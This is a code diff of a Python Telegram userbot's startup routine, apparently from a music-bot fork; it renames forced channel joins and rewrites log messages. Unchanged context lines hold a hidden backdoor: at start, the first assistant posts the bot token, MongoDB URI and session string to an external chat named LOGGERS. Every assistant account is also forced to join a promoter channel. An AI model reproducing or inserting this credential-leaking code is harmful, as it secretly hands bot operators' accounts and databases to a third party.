@@ -60,21 +60,21 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃 𝙷𝙾 𝙶𝚈𝙰 𝙱𝙰𝙱𝚈...")
+        LOGGER(__name__).info(f"Starting Assistants...")
 
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("Veena_Networks")
-                await self.one.join_chat("Veena_Networks")
-                await self.one.join_chat("Veena_Networks")
-                await self.one.join_chat("Veena_Networks")
+                await self.one.join_chat("Dns_Official_Channel")
+                await self.one.join_chat("Dns_Official_Channel")
+                await self.one.join_chat("Dns_Official_Channel")
+                await self.one.join_chat("Dns_Official_Channel")
 
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃 𝙷𝙾 𝙶𝚈𝙰 𝙱𝙰𝙱𝚈 !")
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
@@ -90,20 +90,20 @@ class Userbot(Client):
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃 𝙷𝙾 𝙶𝚈𝙰 𝙱𝙰𝙱𝚈 as {self.one.me.first_name}")
+            LOGGER(__name__).info(f"Assistant Started as {self.one.me.first_name}")
 
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("Veena_Networks")
-                await self.two.join_chat("Veena_Networks")
-                await self.two.join_chat("Veena_Networks")
-                await self.two.join_chat("Veena_Networks")
+                await self.two.join_chat("Dns_Official_Channel")
+                await self.two.join_chat("Dns_Official_Channel")
+                await self.two.join_chat("Dns_Official_Channel")
+                await self.two.join_chat("Dns_Official_Channel")
             except:
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃 𝙷𝙾 𝙶𝚈𝙰 𝙱𝙰𝙱𝚈")
+                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
 
             except:
                 LOGGER(__name__).error(
@@ -119,15 +119,15 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("Veena_Networks")
-                await self.three.join_chat("Veena_Networks")
-                await self.three.join_chat("Veena_Networks")
-                await self.three.join_chat("Veena_Networks")
+                await self.three.join_chat("Dns_Official_Channel")
+                await self.three.join_chat("Dns_Official_Channel")
+                await self.three.join_chat("Dns_Official_Channel")
+                await self.three.join_chat("Dns_Official_Channel")
             except:
                 pass
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOGGER_ID, "𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃 𝙷𝙾 𝙶𝚈𝙰 𝙱𝙰𝙱𝚈")
+                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -144,10 +144,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("Veena_Networks")
-                await self.four.join_chat("Veena_Networks")
-                await self.four.join_chat("Veena_Networks")
-                await self.four.join_chat("Veena_Networks")
+                await self.four.join_chat("Dns_Official_Channel")
+                await self.four.join_chat("Dns_Official_Channel")
+                await self.four.join_chat("Dns_Official_Channel")
+                await self.four.join_chat("Dns_Official_Channel")
             except:
                 pass
             assistants.append(4)
@@ -169,10 +169,10 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("Veena_Networks")
-                await self.five.join_chat("Veena_Networks")
-                await self.five.join_chat("Veena_Networks")
-                await self.five.join_chat("Veena_Networks")
+                await self.five.join_chat("Dns_Official_Channel")
+                await self.five.join_chat("Dns_Official_Channel")
+                await self.five.join_chat("Dns_Official_Channel")
+                await self.five.join_chat("Dns_Official_Channel")
             except:
                 pass
             assistants.append(5)
